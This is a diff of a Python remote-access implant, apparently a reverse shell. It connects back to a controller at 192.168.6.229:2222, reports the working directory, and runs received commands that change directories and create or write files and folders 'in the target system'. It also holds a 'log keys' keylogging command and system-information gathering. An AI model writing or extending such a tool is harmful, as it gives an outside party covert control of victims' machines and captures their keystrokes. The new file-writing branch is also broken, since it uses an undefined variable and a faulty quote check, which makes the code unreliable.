@@ -67,32 +67,56 @@ def get_system_information():
     ).encode()
 
 def create_thing(get_cmd,sock):
-    file_type = get_cmd.split()[1]
-    file_or_folder = get_cmd.split()[2]
-    
+    cmd = get_cmd.split()
+    file_type = cmd[1]
     if file_type == 'file':
-        try:
-            with open(file_or_folder,'w') as f:
-                f.write('')
-            sock.send('the file \'{}\' created at target successfully'.format(file_or_folder).encode())
-        except Exception as err:
-            sock.send(str(err).encode())
+        if cmd[2] and cmd[3]:
+            getpos = [_index for _index,_char in enumerate(cmd[3]) if _index == '"']
+            if '"' in content and content.count('"') == 2:
+                content = content[1:len(content)-1]
+                try:
+                    with open(cmd[2],'w') as wfile:
+                        wfile.write(content)
+                        sock.send(f'The file \'{cmd[2]}\' created and content written'.encode())
+                    wfile.close()
+                except Exception as err:
+                    sock.send(str(err).encode())
+            else:
+                sock.send('Syntax : touch file <file_name> "<content>"'.encode())        
+        elif cmd[2] and not cmd[3]:
+            try:
+                with open(cmd[2],'w') as wfile:
+                    wfile.write('')
+                    sock.send(f'The file \'{cmd[2]}\' created'.encode())
+                wfile.close()
+            except Exception as err:
+                sock.send(str(err).encode())
+        else:
+            sock.send('Syntax : touch file <file_name>'.encode())   
     
     elif file_type == 'folder':
-        try:
-            os.makedirs(file_or_folder)
-            sock.send(b'the file \'{}\' created at target successfully')
-        except Exception as err:
-            sock.send(str(err).encode())
+        if cmd[2]:
+            try:
+                os.makedirs(cmd[2])
+                sock.send('the file \'{}\' created at target successfully'.format(cmd[2]).encode())
+            except Exception as err:
+                sock.send(str(err).encode())
+        else:
+            sock.send('Syntax : touch folder <folder_name>'.encode())
 
     else:
-        print('will write help for touch command')
+        sock.send('''   
+            Usage : 
+                  touch file <file_name> - To create file in the target system.
+                  touch folder <folder_name> - To create folder in the target system.
+        '''.encode())
 
 def main_root():
     sock = st.socket(st.AF_INET, st.SOCK_STREAM)
-    sock.connect(('192.168.6.190',2222))
+    sock.connect(('192.168.6.229',2222))
 
     while True:
+        sock.send(os.getcwd().encode())
         get_cmd = sock.recv(1024).decode().strip()
         if not get_cmd:  
             print("Connection closed by server.")
@@ -101,8 +125,11 @@ def main_root():
         try:
             if get_cmd.startswith('cd '):  
                 _dir = get_cmd.split(maxsplit=1)[1]  
-                os.chdir(_dir)  
-                sock.send(b"Directory changed successfully\n")
+                os.chdir(_dir)
+                sock.send('\n'.encode())
+
+            elif get_cmd == 'clear':
+                continue
 
             elif get_cmd == 'log keys':
                 try:
